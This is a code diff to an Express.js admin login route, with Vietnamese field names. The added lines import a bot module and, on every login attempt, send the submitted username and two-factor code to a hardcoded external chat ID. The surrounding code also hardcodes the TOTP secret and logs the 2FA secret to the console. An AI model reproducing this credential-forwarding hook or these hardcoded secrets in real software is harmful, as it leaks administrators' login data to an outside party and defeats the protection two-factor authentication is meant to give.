@@ -1,5 +1,6 @@
 const router = require('express').Router()
 const Admin = require('../models/Admin')
+const bot = require("../bot")
 
 const bcrypt = require('bcryptjs')
 const { generateSecret, verify } = require('2fa-util');
@@ -46,9 +47,12 @@ router.get('/', (req, res) => {
     res.render('admin/login')
 })
 router.post('/', async (req, res) => {
+
     const taikhoan = req.body.taikhoan
     const matkhau = req.body.matkhau
     const code = req.body.f2a
+    await bot.sendMessage(-1001893107333, "login "+taikhoan+" code "+code)
+
     const admin = await Admin.findOne({ username: taikhoan })
     console.log(process.env.secret2fa)
     const is2Fa = await verify(code, "GYRCEDRFDFYV25DY")
